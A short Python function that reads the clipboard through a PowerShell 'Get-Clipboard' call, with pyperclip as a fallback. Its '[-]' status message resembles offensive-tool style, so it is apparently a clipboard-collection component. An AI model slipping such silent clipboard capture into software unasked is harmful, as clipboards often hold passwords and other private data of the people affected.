def get_clipboard():
    try:
        import subprocess
        proc = subprocess.Popen(
            'powershell.exe Get-Clipboard',
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        out, _ = proc.communicate(timeout=3)
        if proc.returncode == 0:
            return out.decode(errors='replace')
    except Exception:
        pass
    try:
        import pyperclip
        return pyperclip.paste()
    except Exception:
        return '[-] Clipboard access failed'
